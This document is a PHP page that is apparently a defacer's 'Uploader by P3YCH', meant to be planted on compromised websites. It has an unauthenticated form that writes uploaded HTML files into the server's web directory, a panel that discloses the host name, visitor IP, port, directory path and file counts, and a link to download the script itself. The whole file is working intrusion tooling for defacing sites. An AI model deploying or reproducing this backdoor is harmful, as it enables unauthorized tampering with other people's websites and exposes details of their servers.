<?php
$dir = __DIR__;
$file_count = 0;
$dir_count = 0;

if (is_dir($dir)){
  if ($dh = opendir($dir)){
    while (($file = readdir($dh)) !== false){
      if($file != '.' && $file != '..'){
        if(is_file($dir.'/'.$file)){
          $file_count++;
        } elseif(is_dir($dir.'/'.$file)){
          $dir_count++;
        }
      }
    }
    closedir($dh);
  }
}

if (isset($_GET['p3ych_download'])) {
  $filename = $_GET['p3ych_download'];
  $file_location = realpath(dirname(__FILE__)) . '/' . $filename;
  
  if ($filename === basename(__FILE__) && file_exists($file_location) && is_readable($file_location)) {
    header('Content-type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . $filename . '"');
    header('Content-Length: ' . filesize($file_location));
    header('Cache-Control: no-cache');
    header('Pragma: no-cache');
    readfile($file_location);
    exit;
  } else {
    ?>
    <div class="alert alert-danger" role="alert">
      Error, silakan coba lagi.
    </div>
    <?php
  }
}
?>

<!DOCTYPE html>
<html>
  <head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta content="index, follow, notranslate" name="robots" />
    <meta content="index, follow, notranslate" name="googlebot" />
    <meta content='Hidup cuma sebentar, tapi sholat nomer 1' name='description'/>
    <meta content='P3YCH, Uploader by Sayu' name='keywords'/>
    <meta content="P3YCH" name="author" />
    <meta content="Copyright ©️ P3YCH - All Right Reserved" name="copyright" />
    <meta content='Uploader by P3YCH' name='twitter:image:alt'/>
    <meta content='https://p3ych.github.io/img/topic/hacked/logo/rabbit/logo-team-rabbit(dki-jakarta).png' name='twitter:image:src'/>
    <title>Uploader by P3YCH</title>
    <link href='https://p3ych.github.io/img/topic/hacked/logo/rabbit/logo-team-rabbit(dki-jakarta).png' rel='manifest'/>
    <link href='https://p3ych.github.io/img/topic/hacked/logo/rabbit/logo-team-rabbit(dki-jakarta).png' sizes='120x120'/>
    <link href='https://p3ych.github.io/img/topic/hacked/logo/rabbit/logo-team-rabbit(dki-jakarta).png' sizes='152x152'/>
    <link href='https://p3ych.github.io/img/topic/hacked/logo/rabbit/logo-team-rabbit(dki-jakarta).png' sizes='180x180'/>
    <link href='https://p3ych.github.io/img/topic/hacked/logo/rabbit/logo-team-rabbit(dki-jakarta).png' rel='icon' type='image/x-icon'/>
    
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-rbsA2VBKQhggwzxH7pPCaAqO46MgnOM80zW1RWuH61DGLwZJEdK2Kadq2F9CUG65" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-dark@5.0.15/dark.min.css" type="text/css" media="all" />
  </head>
  <style type="text/css" media="all">
    @import url('https://fonts.googleapis.com/css2?family=Delicious+Handrawn&display=swap');
    body {
      color: var(--bs-white);
      background: var(--bs-black);
      font-family: 'Delicious Handrawn', cursive;
    }
    a {
      text-decoration: none;
    }
    .modal-backdrop {
      background: none;
    }
    .blur {
      backdrop-filter: blur(10px);
    }
  </style>
  <body>
    <nav class="navbar navbar-expand fixed-top d-none d-md-block d-lg-block d-xl-block bg-dark rounded-top shadow">
      <ul class="navbar-nav nav-justified w-100" style="margin-right:1rem!important">
        <li class="nav-item text-center">
          <a class="nav-link" data-bs-toggle="modal" data-bs-target="#informasi">
            <svg height="1.8rem" viewBox="0 0 21 21" width="1.8rem" xmlns="http://www.w3.org/2000/svg" class="text-light"><g fill="none" fill-rule="evenodd" transform="translate(-1 -1)"><path d="m14.517 3.5 4.983 5v6l-4.983 5h-6.017l-5-5v-6l5-5z" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"/><path d="m11.5 12.5v-5" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"/><circle cx="11.5" cy="15.5" fill="currentColor" r="1"/></g></svg>
          </a>
        </li>
        <li class="nav-item text-center">
          <a class="nav-link" onclick="share()">
            <svg height="1.8rem" viewBox="0 0 21 21" width="1.8rem" xmlns="http://www.w3.org/2000/svg" class="text-light"><g fill="none" fill-rule="evenodd" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" transform="translate(3 3)"><path d="m11.5 4.5-3.978-4-4.022 4"/><path d="m7.522.521v11.979"/><path d="m4.5 7.5h-2c-1.1045695 0-2 .8954305-2 2v4c0 1.1045695.8954305 2 2 2h10c1.1045695 0 2-.8954305 2-2v-4c0-1.1045695-.8954305-2-2-2h-2"/></g></svg>
          </a>
        </li>
        <li class="nav-item text-center">
          <a class="nav-link" onclick="resetPage()">
            <svg height="1.8rem" viewBox="0 0 21 21" width="1.8rem" xmlns="http://www.w3.org/2000/svg" class="text-light"><g fill="none" fill-rule="evenodd" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" transform="translate(2 2)"><path d="m4.5 1.5c-2.41169541 1.37786776-4 4.02354835-4 7 0 4.418278 3.581722 8 8 8m4-1c2.2866288-1.4081018 4-4.1175492 4-7 0-4.418278-3.581722-8-8-8"/><path d="m4.5 5.5v-4h-4"/><path d="m12.5 11.5v4h4"/></g></svg>
          </a>
        </li>
        <li class="nav-item text-center">
          <a class="nav-link" href="?p3ych_download=<?php echo basename(__FILE__) ?>" class="text-danger" download="helo">
            <svg height="1.8rem" viewBox="0 0 21 21" width="1.8rem" xmlns="http://www.w3.org/2000/svg" class="text-light"><g fill="none" fill-rule="evenodd" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" transform="translate(3 3)"><path d="m11.5 8.5-3.978 4-4.022-4"/><path d="m7.522.521v11.979"/><path d="m.5 9v4.5c0 1.1045695.8954305 2 2 2h10c1.1045695 0 2-.8954305 2-2v-4.5"/></g></svg>
          </a>
        </li>
      </ul>
    </nav>
    <div class="d-none d-md-block d-lg-block d-xl-block">
      <br />
      <br />
      <br />
      <br />
      <br />
      <br />
      <br />
      <br />
    </div>
    <div class="container text-center" style="align-items: center;display: flex;justify-content: center;height: 75vh;">
      <form action="" method="POST" enctype="multipart/form-data">
        <div class="row">
          <div class="col-12">
            <img class="img-fluid w-75 d-md-none d-lg-none d-xl-none" src="https://p3ych.github.io/img/topic/hacked/logo/rabbit/logo-team-rabbit(dki-jakarta).png" alt="" />
            <img class="img-fluid w-50 d-none d-md-block d-lg-block d-xl-block mx-auto" src="https://p3ych.github.io/img/topic/hacked/logo/rabbit/logo-team-rabbit(dki-jakarta).png" alt="" />
          </div>
          <div class="col-12 mb-2">
            <h1 class="fw-bold">Uploader by P3YCH</h1>
            <p class="h4">Hidup cuma sebentar, tapi sholat nomer 1</p>
          </div>
          <div class="col-6">
            <input class="form-control text-light bg-black" type="text" value="<?php echo basename(__DIR__) ?>" readonly>
          </div>
          <div class="col-6">
            <input type="file" class="form-control text-light bg-black" id="htmlFile" name="htmlFile" required>
          </div>
          <div class="col-12">
            <div class="d-grid gap-2 mt-3">
              <button class="btn border text-light bg-black" type="submit">Upload</button>
            </div>
          </div>
        </div>
        <div class="row">
          <?php
          if(isset($_FILES['htmlFile'])) {
            $fileName = $_FILES['htmlFile']['name'];
            $fileType = $_FILES['htmlFile']['type'];
            $fileSize = $_FILES['htmlFile']['size'];
            $fileTmp = $_FILES['htmlFile']['tmp_name'];
            
            $fileExt = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));
            if($fileExt != "html"){
              ?>
              <div class="col-12 mt-3">
                <div class="alert alert-danger">Hanya bisa upload html saja.
                </div>
              </div>
              <?php
              exit();
            }
            
            $uploadPath = __DIR__ . "/" . $fileName;
            if(move_uploaded_file($fileTmp, $uploadPath)){
              ?>
              <div class="col-6 mt-3">
                <div class='alert alert-success'>
                  File uploaded successfully.
                </div>
              </div>
              <div class="col-6 mt-3">
                <a href=" <?php echo basename($uploadPath) ?> " class="text-reset text-decoration-none">
                  <div class="alert alert-success">
                    Link ya
                  </div>
                </a>
              </div>
              <?php
              } else {
              ?>
              <div class='alert alert-danger'>Upload gagal!</div>
              <?php
            }
          }
          ?>
        </div>
      </form>
    </div>
    <div class="d-none d-md-block d-lg-block d-xl-block">
      <br />
      <br />
      <br />
      <br />
      <br />
      <br />
      <br />
    </div>
    <nav class="navbar navbar-expand fixed-bottom d-md-none d-lg-none d-xl-none bg-dark rounded-top shadow" style="z-index:-9999;">
      <ul class="navbar-nav nav-justified w-100" style="margin-right:1rem!important">
        <li class="nav-item text-center">
          <a class="nav-link" data-bs-toggle="modal" data-bs-target="#informasi">
            <svg height="1.8rem" viewBox="0 0 21 21" width="1.8rem" xmlns="http://www.w3.org/2000/svg" class="text-light"><g fill="none" fill-rule="evenodd" transform="translate(-1 -1)"><path d="m14.517 3.5 4.983 5v6l-4.983 5h-6.017l-5-5v-6l5-5z" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"/><path d="m11.5 12.5v-5" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"/><circle cx="11.5" cy="15.5" fill="currentColor" r="1"/></g></svg>
          </a>
        </li>
        <li class="nav-item text-center">
          <a class="nav-link" onclick="share()">
            <svg height="1.8rem" viewBox="0 0 21 21" width="1.8rem" xmlns="http://www.w3.org/2000/svg" class="text-light"><g fill="none" fill-rule="evenodd" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" transform="translate(3 3)"><path d="m11.5 4.5-3.978-4-4.022 4"/><path d="m7.522.521v11.979"/><path d="m4.5 7.5h-2c-1.1045695 0-2 .8954305-2 2v4c0 1.1045695.8954305 2 2 2h10c1.1045695 0 2-.8954305 2-2v-4c0-1.1045695-.8954305-2-2-2h-2"/></g></svg>
          </a>
        </li>
        <li class="nav-item text-center">
          <a class="nav-link" onclick="resetPage()">
            <svg height="1.8rem" viewBox="0 0 21 21" width="1.8rem" xmlns="http://www.w3.org/2000/svg" class="text-light"><g fill="none" fill-rule="evenodd" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" transform="translate(2 2)"><path d="m4.5 1.5c-2.41169541 1.37786776-4 4.02354835-4 7 0 4.418278 3.581722 8 8 8m4-1c2.2866288-1.4081018 4-4.1175492 4-7 0-4.418278-3.581722-8-8-8"/><path d="m4.5 5.5v-4h-4"/><path d="m12.5 11.5v4h4"/></g></svg>
          </a>
        </li>
        <li class="nav-item text-center">
          <a class="nav-link" href="?p3ych_download=<?php echo basename(__FILE__) ?>" class="text-danger" download="helo">
            <svg height="1.8rem" viewBox="0 0 21 21" width="1.8rem" xmlns="http://www.w3.org/2000/svg" class="text-light"><g fill="none" fill-rule="evenodd" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" transform="translate(3 3)"><path d="m11.5 8.5-3.978 4-4.022-4"/><path d="m7.522.521v11.979"/><path d="m.5 9v4.5c0 1.1045695.8954305 2 2 2h10c1.1045695 0 2-.8954305 2-2v-4.5"/></g></svg>
          </a>
        </li>
      </ul>
    </nav>
    
    <div class="modal fade blur" id="informasi" tabindex="-1" aria-labelledby="informasiLabel" aria-hidden="true">
      <div class="modal-dialog modal-lg modal-dialog-centered">
        <div class="modal-content bg-dark text-light">
          <div class="modal-header">
            <h1 class="modal-title fs-5" id="informasiLabel">Informasi website (<span><a href="//<?php echo $_SERVER['HTTP_HOST'] ?>" class="text-danger"><?php echo $_SERVER['HTTP_HOST'] ?></a></span>)</h1>
          </div>
          <div class="modal-body">
            <div class="table-responsive">
              <table class="table table-responsive">
                <thead class="text-light">
                  <tr>
                    <th scope="col">Nama address</th>
                    <th scope="col">Ip address</th>
                    <th scope="col">Port address</th>
                    <th scope="col">Dir</th>
                    <th scope="col">Base Dir</th>
                    <th scope="col">Total Folder</th>
                    <th scope="col">Total File</th>
                  </tr>
                </thead>
                <tbody class="text-light">
                  <tr>
                    <td><?php echo $_SERVER['HTTP_HOST'] ?></td>
                    <td><?php echo $_SERVER['REMOTE_ADDR'] ?></td>
                    <td><?php echo $_SERVER['SERVER_PORT'] ?></td>
                    <td><?php echo $dir ?></td>
                    <td><?php echo basename($dir) ?></td>
                    <td><?php echo $file_count ?></td>
                    <td><?php echo $dir_count ?></td>
                  </tr>
                </tbody>
              </table>
            </div>
          </div>
        </div>
      </div>
    </div>
    
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-kenU1KFdBIe4zVF0s0G1M5b4hcpxyD9F7jL+jjXkk+Q2h455rYXK/7HAuoJl+0I4" crossorigin="anonymous"></script>
    <script src="https://cdn.rawgit.com/bungfrangki/efeksalju/2a7805c7/efek-salju.js" type="text/javascript" charset="utf-8"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.18/dist/sweetalert2.min.js" type="text/javascript" charset="utf-8"></script>
    <script type="text/javascript" charset="utf-8">
      function resetPage() {
        window.location.href = window.location.href;
      }
      
      function share() {
        if (navigator.share) {
          navigator.share({
            title: 'Uploader by P3YCH',
            text: 'Uploader by P3YCH',
            url: '<?php echo basename(__FILE__) ?>',
          })
          .then(() => {
            Swal.fire({
              icon: 'success',
              title: 'Berhasil disalin.',
              showConfirmButton: false
            });
          })
          .catch((error) => {
            Swal.fire({
              icon: 'error',
              title: 'Kaya gagal disalin karena kamu close atau kamu gak salin.',
              showConfirmButton: false
            });
          });
        } else {
          Swal.fire({
            icon: 'error',
            title: 'Maaf, browser kamu tidak mendukung fitur ini.',
            showConfirmButton: false
          });
        }
      }
      
      window.addEventListener('load', function() {
        var images = document.getElementsByTagName('img');
        for (var i = 0; i < images.length; i++) {
          var src = images[i].src;
          images[i].src = '';
          images[i].src = src;
        }
      });
    </script>
  </body>
</html>